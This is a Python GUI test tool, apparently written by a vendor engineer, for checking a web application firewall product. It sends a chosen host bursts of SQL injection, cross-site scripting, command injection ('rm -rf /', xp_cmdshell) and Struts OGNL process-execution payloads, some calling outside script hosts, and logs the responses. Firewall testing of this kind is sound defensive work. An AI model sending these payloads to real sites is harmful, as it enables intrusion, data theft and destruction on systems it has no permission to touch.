__author__ = 'mankyun'
#-*- coding: utf-8 -*-

import wx
import requests
import string
import random
import httplib
import urllib

class Example(wx.Frame):

    def __init__(self, *args, **kwargs):
        super(Example, self).__init__(*args, **kwargs)


        self.InitUI()

    def InitUI(self):


        panel = wx.Panel(self)
        vbox = wx.BoxSizer(wx.VERTICAL)

        hbox1 = wx.BoxSizer(wx.HORIZONTAL)
        st1 = wx.StaticText(panel, label='Target URL')
        hbox1.Add(st1, flag=wx.RIGHT, border=8)
        self.tc = wx.TextCtrl(panel)
        hbox1.Add(self.tc,proportion=1)
        vbox.Add(hbox1, flag=wx.ALIGN_CENTER|wx.LEFT|wx.RIGHT|wx.TOP, border=10)

        vbox.Add((-1, 10))

        hbox2 = wx.BoxSizer(wx.HORIZONTAL)
        st2 = wx.StaticText(panel, label='PORT')
        hbox2.Add(st2, flag=wx.RIGHT, border=8)
        self.tc2 = wx.TextCtrl(panel)
        hbox2.Add(self.tc2,proportion=1)
        vbox.Add(hbox2, flag=wx.ALIGN_CENTER|wx.LEFT|wx.RIGHT|wx.TOP, border=5)

        vbox.Add((-1, 25))

        wx.Button(panel, -1, "TEST START", (220,90))

        panel.SetSizer(vbox)


        menubar = wx.MenuBar()
        fileMenu = wx.Menu()
        viewMenu = wx.Menu()
        self.shtl = viewMenu.Append(wx.ID_ANY, 'About WEBFRONT-K TEST TOOL', 'description')
        fitem = fileMenu.Append(wx.ID_EXIT, 'Quit', 'Quit application')

        menubar.Append(fileMenu, '&File')
        menubar.Append(viewMenu, '&Help')
        description = u"이 툴은 보안제품의 안정성 및 보안기능을 좀 더 빠르고 효율적으로 하기 위해 만들어졌습니다.\n\n                     <?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
< TOOL기능 설명 >\n 1. HTTP URL 및 Parameter 요청(GET/POST)\n 2. HTTPS(SSL) URL 및 Parameter 요청(GET/POST)\n 3. 요청검사 공격 기능(SQL/XSS/접근제어/쉘코드/요청형식검사 등)\n 4. 고급첨부파일 기능 검증(반드시 파일 이름을 waf_test.확장자명(ex: waf_test.doc , waf_test.xls)을 사용하셔야 합니다)\n 5. 각 요청에 대한 응답시간 및 서버 응답 코드 확인\n 6. 기타설정(윈도우스케일/쿠키매개변수 검사)\n\n 테스트 결과 자료는 C드라이브에 WEBFRONT-K_test_Rerult.txt 파일로 저장 됩니다.\n\n기능에 대한 문의 사항이나 해당 툴 개선에 대한 의견이 있으신 경우에는 mk.choi@piolink.com으로 메일 부탁드립니다.\n\n                                                                              감사합니다."

        self.about = wx.AboutDialogInfo()
        self.about.SetIcon(wx.Icon('test_icon.ico',wx.BITMAP_TYPE_ICO))
        self.about.SetName("Web Security Test Tool")
        self.about.SetVersion("1.1")
        self.about.SetDescription(description)
        self.about.SetCopyright('(C) 2015-2018 Choi, Mankyun(ferozah83@gmail.com)')


        self.SetMenuBar(menubar)

        self.Bind(wx.EVT_MENU, self.OnQuit, fitem)

        self.Bind(wx.EVT_BUTTON, self.onStart)
        self.Bind(wx.EVT_MENU, self.mankyun, self.shtl)


        self.SetSize((500, 300))
        self.SetTitle('WEBFRONT-K PLOS TEST Tool / Made by Choi Man Kyun of TAC')
        self.SetIcon(wx.Icon('test_icon.ico', wx.BITMAP_TYPE_ICO))
        self.Centre()
        self.Show(True)

    def OnQuit(self, e):
         self.Close()

    def mankyun(self, e):
        wx.AboutBox(self.about)


    def onStart(self, key):
        """

        :type self: object
        """
        target = self.tc.GetValue()
        port = self.tc2.GetValue()
       # rr = requests.get('http://'+target+':'+port)

       # if(port == 443):
       #     srr = requests.get('https://'+target+':'+port)

        self.f = open("C:\WEBFRONT-K_test_Result.txt",'w')

        # URL only
        for i in range(1,10):
            chars=string.ascii_uppercase + string.digits
            ran = ''.join(random.choice(chars) for _ in range(3000))

            if(port == '443'):
                srr = requests.get('https://'+target+':'+port+'/'+ran,verify=False)

                self.f.write("---------- HTTPS TEST ----------")
                self.f.write(srr.url)
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr.elapsed)+"/"+"Status Code:"+str(srr.status_code))
                self.f.write("\n")
                self.f.write("\n")

            else:
                rr =  requests.get('http://'+target+':'+port+'/'+ran)


 #               headers = {
 #                            'User-Agent': 'My User Agent 1.0',
 #                               'From': 'youremail@domain.com'  # This is another valid field
 #                           }

                #testtest = requests.get('http://'+target, headers=headers)
                #print(testtest.headers)



                self.f.write(rr.url)
                self.f.write("\n")
                self.f.write("Response Time:"+str(rr.elapsed)+"/"+"Status Code:"+str(rr.status_code))
                self.f.write("\n")
                self.f.write("\n")


        # URL + Parameter
        for i in range(1,10):
             ran = ''.join(random.choice(chars) for _ in range(5000))

             value1 = 'a'*100
             value2 = 'b'*100
             value3 = 'c'*100
             value4 = 'd'*100
             value5 = 'e'*100
             value6 = 'f'*100
             value7 = 'g'*100
             value8 = 'h'*100
             value9 = 'i'*100
             value10 = 'j'*100
             payload1 = {'key1':value1 , 'key2' : value2, 'key3' : value3, 'key4':value4, 'key5':value5, 'key6' : value6, 'key7':value7, 'key8':value8, 'key9':value9, 'key10':value10, 'key11':ran}

             value11 = "1 or 1=1"
             value12 = "1'OR' 1'='1"
             value13 = "1 EXEC XP_cmdshell"
             value14 = "1 AND 1=1"
             value15 = "1 AND 1=2"
             value16 = "1 AND 1=3"
             value17 = "UNION (SELECT 1, 2, 3, 4, IF(substr(user_pass,1,1) = CHAR(97), SLEEP(5), 0) FROM `wp_users` WHERE ID = 1)"
             value18 = "admin AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM UsersCurrent WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM UsersCurrent WHERE user_id='admin')),1,1)),0)<80--"
             value19 = "DECLARE @S VARCHAR(4000);SET @S=CAST(DECLARE @T VARCHAR(255),@C VARCHAR(255) DECLARE Table_Cursor CURSOR FOR SELECT a.name,b.name FROM sysobject a, syscolumns b WHERE a.id=b AND a.xtype='u' AND(b.xtype=99 OR b.xtype=35 OR b.xtype=231 OR b.xtype=167) OPEN Table_Cursor FETCH NEXT FROM Tanble_Cursor INTO @T,@C WHILE(@@FETCH_STATUS=0) BEGIN EXEC('UPDATE['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+\"<script src=http://statsmy.com/ur.php ></script>\")"
             value20 = "char(50)%2Bchar(49)%2Bchar(56)%2Bchar(49)%2Bchar(94)%2Bdb_name()%2Bchar(94)%2Bchar(50)%2Bchar(49)%2Bchar(56)%2Bchar(49))=1--"
             value21 = " SELECT admin FROM master..sysprocesses WHERE spid = @@SPID"
             value22 = "SELECT char(65)+char(66) , SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) (M)"
             value23 = " ’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’) "
             value24 = "select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1)"
             value25 = "1' ORDER BY 1-- , ' UNION SELECT 1,2,3--"
             value26 = "SELECT SUBSTRING(UsersCurrent,1,1) FROM information_schema.tables > 'A'"
             value27 = "IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';"



             payload2 = { 'user_id':value11 }
             payload3 = { 'user_id':value12 }
             payload4 = { 'user_id':value13 }
             payload5 = { 'user_id':value14 }
             payload6 = { 'user_id':value15 }
             payload7 = { 'user_id':value16 }
             payload8 = { 'user_id':value17 }
             payload9 = { 'user_id':value18 }
             payload10 = { 'user_id':value19 }
             payload11 = { 'user_id':value20 }
             payload12 = { 'user_id':value21 }
             payload13 = { 'user_id':value22 }
             payload14 = { 'user_id':value23 }
             payload15 = { 'user_id':value24 }
             payload16 = { 'user_id':value25 }
             payload17 = { 'user_id':value26 }
             payload18 = { 'user_id':value27 }

             value28 = "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>"
             value29 = "<IMG SRC=\"javascript:alert('XSS');\">"
             value30 = "<a onmouseover=alert(document.cookie)>xxs link</a>"
             value31 = "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
             value32 = "<IMG SRC=# onmouseover=\"alert('xxs')\">"
             value33 = "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>"
             value34 = "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">"
             value35 = "<iframe src=http://ha.ckers.org/scriptlet.html>"
             value36 = "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>"
             value37 = "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">"
             value38 = "<BODY BACKGROUND=\"javascript:alert('XSS')\">"
             value39 = "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>"
             value40 = "<BODY ONLOAD=alert('XSS')>"
             value41 = "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">"
             value42 = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">"
             value43 = "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>"
             value44 = "<TABLE BACKGROUND=\"javascript:alert('XSS')\">"
             value45 = "<BASE HREF=\"javascript:alert('XSS');//\">"
             value46 = "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>"
             value47 = "rm -rf /"
             value48 = "proc_open('./ucfirst.php', $Spec, $handles);"
             value49 = "passthru('./extensions.php -e hair 2>/dev/null',$return_code);"

             value50 = "action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()}" # Struts
             value51 = "redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()}"
             value52 = "redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()}"

             payload19 = {'itemNo':value28 }
             payload20 = {'itemNo':value29 }
             payload21 = {'itemNo':value30 }
             payload22 = {'itemNo':value31 }
             payload23 = {'itemNo':value32 }
             payload24 = {'itemNo':value33 }
             payload25 = {'itemNo':value34 }
             payload26 = {'itemNo':value35 }
             payload27 = {'itemNo':value36 }
             payload28 = {'itemNo':value37 }
             payload29 = {'itemNo':value38 }
             payload30 = {'itemNo':value39 }
             payload31 = {'itemNo':value40 }
             payload32 = {'itemNo':value41 }
             payload33 = {'itemNo':value42 }
             payload34 = {'itemNo':value43 }
             payload35 = {'itemNo':value44 }
             payload36 = {'itemNo':value45 }
             payload37 = {'itemNo':value46 }
             payload38 = {'itemNo':value47 }
             payload39 = {'itemNo':value48 }
             payload40 = {'itemNo':value49 }
             payload41 = {'itemNo':value50 }
             payload42 = {'itemNo':value51 }
             payload43 = {'itemNo':value52 }





             if(port == '443'):

                srr = requests.get('https://'+target+':'+port+'/'+'login.asp',params=payload1, verify=False)
                sarr1 = requests.post('https://'+target+'/'+'login-process.asp', data=payload2, verify=False)
                sarr2 = requests.post('https://'+target+'/'+'login-process.asp', data=payload3, verify=False)
                sarr3 = requests.post('https://'+target+'/'+'login-process.asp', data=payload4, verify=False)
                sarr4 = requests.post('https://'+target+'/'+'login-process.asp', data=payload5, verify=False)
                sarr5 = requests.post('https://'+target+'/'+'login-process.asp', data=payload6, verify=False)
                sarr6 = requests.post('https://'+target+'/'+'login-process.asp', data=payload7, verify=False)
                sarr7 = requests.post('https://'+target+'/'+'login-process.asp', data=payload8, verify=False)
                sarr8 = requests.post('https://'+target+'/'+'login-process.asp', data=payload9, verify=False)
                sarr9 = requests.post('https://'+target+'/'+'login-process.asp', data=payload10, verify=False)
                sarr10 = requests.post('https://'+target+'/'+'login-process.asp', data=payload11, verify=False)
                sarr11 = requests.post('https://'+target+'/'+'login-process.asp', data=payload12, verify=False)
                sarr12 = requests.post('https://'+target+'/'+'login-process.asp', data=payload13, verify=False)
                sarr13 = requests.post('https://'+target+'/'+'login-process.asp', data=payload14, verify=False)
                sarr14 = requests.post('https://'+target+'/'+'login-process.asp', data=payload15, verify=False)
                sarr15 = requests.post('https://'+target+'/'+'login-process.asp', data=payload16, verify=False)
                sarr16 = requests.post('https://'+target+'/'+'login-process.asp', data=payload17, verify=False)
                sarr17 = requests.post('https://'+target+'/'+'login-process.asp', data=payload18, verify=False)

                headers = {'Cache-Control': 'no-store, must-revalidate'} # CC attack
                headers1 = { 'Cookie': 'ASPSESSIONIDQQBCDACC=DCIBNLIBGGLCOLAMPNPNKHBJ; erpcookie=userlocale=1042&userprivname=%B0%FC%B8%AE%C0%DA&userpriv=1&username=%B0%FC%B8%AE%C0%DA&userid=admin or 1=1--'*100 } # pa Cookie
                #sarr18 = requests.get('https://'+target+'/'+'login.asp', headers=headers, verify=False)
                #sarr19 = requests.get('https://'+target+'/'+'main.asp', headers=headers1, verify=False)

             #   sarr20 = requests.options('https://'+target+'/'+'login.asp', verify=False)
             #   sarr21 = requests.put('https://'+target+'/'+'login.asp', verify=False)
             #   sarr22 = requests.head('https://'+target+'/'+'login.asp', verify=False)

                sarr23 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload19, verify=False)
                sarr24 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload20, verify=False)
                sarr25 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload21, verify=False)
                sarr26 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload22, verify=False)
                sarr27 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload23, verify=False)
                sarr28 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload24, verify=False)
                sarr29 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload25, verify=False)
                sarr30 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload26, verify=False)
                sarr31 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload27, verify=False)
                sarr32 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload28, verify=False)
                sarr33 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload29, verify=False)
                sarr34 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload30, verify=False)
                sarr35 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload31, verify=False)
                sarr36 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload32, verify=False)
                sarr37 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload33, verify=False)
                sarr38 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload34, verify=False)
                sarr39 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload35, verify=False)
                sarr40 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload36, verify=False)
                sarr41 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload37, verify=False)
                sarr42 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload38, verify=False)
                sarr43 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload39, verify=False)
                sarr44 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload40, verify=False)
                sarr45 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload41, verify=False)
                sarr46 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload42, verify=False)
                sarr47 = requests.get('https://'+target+'/'+'pds/pds_view.asp',params=payload43, verify=False)

                self.f.write(sarr1.url)
                self.f.write("\n")
                self.f.write(str(sarr1.request.headers))
                self.f.write("\n")
                self.f.write(str(payload2))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr1.elapsed)+"/"+"Status Code:"+str(sarr1.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr2.url)
                self.f.write("\n")
                self.f.write(str(sarr2.request.headers))
                self.f.write("\n")
                self.f.write(str(payload3))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr2.elapsed)+"/"+"Status Code:"+str(sarr2.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr3.url)
                self.f.write("\n")
                self.f.write(str(sarr3.request.headers))
                self.f.write("\n")
                self.f.write(str(payload4))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr3.elapsed)+"/"+"Status Code:"+str(sarr3.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr4.url)
                self.f.write("\n")
                self.f.write(str(sarr4.request.headers))
                self.f.write("\n")
                self.f.write(str(payload5))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr4.elapsed)+"/"+"Status Code:"+str(sarr4.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr5.url)
                self.f.write("\n")
                self.f.write(str(sarr5.request.headers))
                self.f.write("\n")
                self.f.write(str(payload6))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr5.elapsed)+"/"+"Status Code:"+str(sarr5.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr6.url)
                self.f.write("\n")
                self.f.write(str(sarr6.request.headers))
                self.f.write("\n")
                self.f.write(str(payload7))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr6.elapsed)+"/"+"Status Code:"+str(sarr6.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr7.url)
                self.f.write("\n")
                self.f.write(str(sarr7.request.headers))
                self.f.write("\n")
                self.f.write(str(payload8))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr7.elapsed)+"/"+"Status Code:"+str(sarr7.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr8.url)
                self.f.write("\n")
                self.f.write(str(sarr8.request.headers))
                self.f.write("\n")
                self.f.write(str(payload9))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr8.elapsed)+"/"+"Status Code:"+str(sarr8.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr9.url)
                self.f.write("\n")
                self.f.write(str(sarr9.request.headers))
                self.f.write("\n")
                self.f.write(str(payload10))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr9.elapsed)+"/"+"Status Code:"+str(sarr9.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr10.url)
                self.f.write("\n")
                self.f.write(str(sarr10.request.headers))
                self.f.write("\n")
                self.f.write(str(payload11))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr10.elapsed)+"/"+"Status Code:"+str(sarr10.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr11.url)
                self.f.write("\n")
                self.f.write(str(sarr11.request.headers))
                self.f.write("\n")
                self.f.write(str(payload12))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr11.elapsed)+"/"+"Status Code:"+str(sarr11.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr12.url)
                self.f.write("\n")
                self.f.write(str(sarr12.request.headers))
                self.f.write("\n")
                self.f.write(str(payload13))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr12.elapsed)+"/"+"Status Code:"+str(sarr12.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr13.url)
                self.f.write("\n")
                self.f.write(str(sarr13.request.headers))
                self.f.write("\n")
                self.f.write(str(payload14))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr13.elapsed)+"/"+"Status Code:"+str(sarr13.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr14.url)
                self.f.write("\n")
                self.f.write(str(sarr14.request.headers))
                self.f.write("\n")
                self.f.write(str(payload15))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr14.elapsed)+"/"+"Status Code:"+str(sarr14.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr15.url)
                self.f.write("\n")
                self.f.write(str(sarr15.request.headers))
                self.f.write("\n")
                self.f.write(str(payload16))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr15.elapsed)+"/"+"Status Code:"+str(sarr15.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr16.url)
                self.f.write("\n")
                self.f.write(str(sarr16.request.headers))
                self.f.write("\n")
                self.f.write(str(payload17))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr16.elapsed)+"/"+"Status Code:"+str(sarr16.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr17.url)
                self.f.write("\n")
                self.f.write(str(sarr17.request.headers))
                self.f.write("\n")
                self.f.write(str(payload18))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr17.elapsed)+"/"+"Status Code:"+str(sarr17.status_code))
                self.f.write("\n")
                self.f.write("\n")

                #self.f.write(sarr18.url)
                #self.f.write("\n")
                #self.f.write(str(sarr18.request.headers))
               # self.f.write("\n")
                #self.f.write("Response Time:"+str(sarr17.elapsed)+"/"+"Status Code:"+str(sarr18.status_code))
               # self.f.write("\n")
               # self.f.write("\n")

               # self.f.write(sarr19.url)
               # self.f.write("\n")
               # self.f.write(str(sarr19.request.headers))
               # self.f.write("\n")
              #  self.f.write("Response Time:"+str(sarr19.elapsed)+"/"+"Status Code:"+str(sarr19.status_code))
              #  self.f.write("\n")
              #  self.f.write("\n")

              #  self.f.write(sarr20.url)
              #  self.f.write("\n")
              #  self.f.write(str(sarr20.request.headers))
              #  self.f.write("\n")
              #  self.f.write("Response Time:"+str(sarr20.elapsed)+"/"+"Status Code:"+str(sarr20.status_code))
              #  self.f.write("\n")
              #  self.f.write("\n")

               # self.f.write(sarr21.url)
              #  self.f.write("\n")
              #  self.f.write(str(sarr21.request.headers))
               # self.f.write("\n")
              #  self.f.write("Response Time:"+str(sarr21.elapsed)+"/"+"Status Code:"+str(sarr21.status_code))
               # self.f.write("\n")
              #  self.f.write("\n")

              #  self.f.write(sarr22.url)
              #  self.f.write("\n")
               # self.f.write(str(sarr22.request.headers))
              #  self.f.write("\n")
              #  self.f.write("Response Time:"+str(sarr22.elapsed)+"/"+"Status Code:"+str(sarr22.status_code))
              #  self.f.write("\n")
             #   self.f.write("\n")

                self.f.write(sarr23.url)
                self.f.write("\n")
                self.f.write(str(sarr23.request.headers))
                self.f.write("\n")
                self.f.write(str(payload19))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr23.elapsed)+"/"+"Status Code:"+str(sarr23.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr24.url)
                self.f.write("\n")
                self.f.write(str(sarr24.request.headers))
                self.f.write("\n")
                self.f.write(str(payload20))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr24.elapsed)+"/"+"Status Code:"+str(sarr24.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr25.url)
                self.f.write("\n")
                self.f.write(str(sarr25.request.headers))
                self.f.write("\n")
                self.f.write(str(payload21))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr25.elapsed)+"/"+"Status Code:"+str(sarr25.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr26.url)
                self.f.write("\n")
                self.f.write(str(sarr26.request.headers))
                self.f.write("\n")
                self.f.write(str(payload22))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr26.elapsed)+"/"+"Status Code:"+str(sarr26.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr27.url)
                self.f.write("\n")
                self.f.write(str(sarr27.request.headers))
                self.f.write("\n")
                self.f.write(str(payload23))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr27.elapsed)+"/"+"Status Code:"+str(sarr27.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr28.url)
                self.f.write("\n")
                self.f.write(str(sarr28.request.headers))
                self.f.write("\n")
                self.f.write(str(payload24))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr28.elapsed)+"/"+"Status Code:"+str(sarr28.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr29.url)
                self.f.write("\n")
                self.f.write(str(sarr29.request.headers))
                self.f.write("\n")
                self.f.write(str(payload25))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr29.elapsed)+"/"+"Status Code:"+str(sarr29.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr30.url)
                self.f.write("\n")
                self.f.write(str(sarr30.request.headers))
                self.f.write("\n")
                self.f.write(str(payload26))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr30.elapsed)+"/"+"Status Code:"+str(sarr30.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr31.url)
                self.f.write("\n")
                self.f.write(str(sarr31.request.headers))
                self.f.write("\n")
                self.f.write(str(payload27))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr31.elapsed)+"/"+"Status Code:"+str(sarr31.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr32.url)
                self.f.write("\n")
                self.f.write(str(sarr32.request.headers))
                self.f.write("\n")
                self.f.write(str(payload28))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr32.elapsed)+"/"+"Status Code:"+str(sarr32.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr33.url)
                self.f.write("\n")
                self.f.write(str(sarr33.request.headers))
                self.f.write("\n")
                self.f.write(str(payload29))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr33.elapsed)+"/"+"Status Code:"+str(sarr33.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr34.url)
                self.f.write("\n")
                self.f.write(str(sarr34.request.headers))
                self.f.write("\n")
                self.f.write(str(payload30))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr34.elapsed)+"/"+"Status Code:"+str(sarr34.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr35.url)
                self.f.write("\n")
                self.f.write(str(sarr35.request.headers))
                self.f.write("\n")
                self.f.write(str(payload31))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr35.elapsed)+"/"+"Status Code:"+str(sarr35.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr36.url)
                self.f.write("\n")
                self.f.write(str(sarr36.request.headers))
                self.f.write("\n")
                self.f.write(str(payload32))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr36.elapsed)+"/"+"Status Code:"+str(sarr36.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr37.url)
                self.f.write("\n")
                self.f.write(str(sarr37.request.headers))
                self.f.write("\n")
                self.f.write(str(payload33))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr37.elapsed)+"/"+"Status Code:"+str(sarr37.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr38.url)
                self.f.write("\n")
                self.f.write(str(sarr38.request.headers))
                self.f.write("\n")
                self.f.write(str(payload34))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr38.elapsed)+"/"+"Status Code:"+str(sarr38.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr39.url)
                self.f.write("\n")
                self.f.write(str(sarr39.request.headers))
                self.f.write("\n")
                self.f.write(str(payload35))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr39.elapsed)+"/"+"Status Code:"+str(sarr39.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr40.url)
                self.f.write("\n")
                self.f.write(str(sarr40.request.headers))
                self.f.write("\n")
                self.f.write(str(payload36))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr40.elapsed)+"/"+"Status Code:"+str(sarr40.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr41.url)
                self.f.write("\n")
                self.f.write(str(sarr41.request.headers))
                self.f.write("\n")
                self.f.write(str(payload37))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr41.elapsed)+"/"+"Status Code:"+str(sarr41.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr42.url)
                self.f.write("\n")
                self.f.write(str(sarr42.request.headers))
                self.f.write("\n")
                self.f.write(str(payload38))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr42.elapsed)+"/"+"Status Code:"+str(sarr42.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr43.url)
                self.f.write("\n")
                self.f.write(str(sarr43.request.headers))
                self.f.write("\n")
                self.f.write(str(payload39))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr43.elapsed)+"/"+"Status Code:"+str(sarr43.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr44.url)
                self.f.write("\n")
                self.f.write(str(sarr44.request.headers))
                self.f.write("\n")
                self.f.write(str(payload40))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr44.elapsed)+"/"+"Status Code:"+str(sarr44.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr45.url)
                self.f.write("\n")
                self.f.write(str(sarr45.request.headers))
                self.f.write("\n")
                self.f.write(str(payload41))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr45.elapsed)+"/"+"Status Code:"+str(sarr45.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr46.url)
                self.f.write("\n")
                self.f.write(str(sarr46.request.headers))
                self.f.write("\n")
                self.f.write(str(payload42))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr46.elapsed)+"/"+"Status Code:"+str(sarr46.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(sarr47.url)
                self.f.write("\n")
                self.f.write(str(sarr47.request.headers))
                self.f.write("\n")
                self.f.write(str(payload43))
                self.f.write("\n")
                self.f.write("Response Time:"+str(sarr47.elapsed)+"/"+"Status Code:"+str(sarr47.status_code))
